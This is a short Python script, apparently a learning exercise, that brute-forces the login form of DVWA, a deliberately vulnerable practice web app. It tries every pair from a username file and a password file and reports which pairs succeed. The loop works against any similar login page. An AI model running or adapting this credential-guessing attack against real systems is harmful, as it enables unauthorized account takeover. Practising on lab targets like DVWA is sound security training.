# author: Kamal Uddin
# version: 1.0v
import requests
import termcolor
import os


def get_dvwa_url(url, paswd_file, users_file):
    get_url = input("Enter your Dvwa url:" + url)
    get_pass = input("Enter your password file:" + paswd_file)
    get_user = input("Enter your username file:" + users_file)

    with open(get_user, mode='r') as u_file:
        u_file = u_file.readlines()

    with open(get_pass, mode='r') as p_file:
        pass_file = p_file.readlines()

    for username in u_file:
        username = username.strip().split("\n")
        for password in pass_file:
            password = password.strip().split("\n")

            payload = {

                "username": username,
                "password": password,
                "Login": "submit"

            }

            get_data = requests.post(get_url, data=payload)

            if "Login failed" in str(get_data.content):
                print(termcolor.colored(f"Your username {username} Your Password {password} is wrong", "red"))
            else:
                print(termcolor.colored(f"Your username {username} Your Password {password} is correct", "green"))


get_dvwa_url(url=" ", paswd_file=" ", users_file=" ")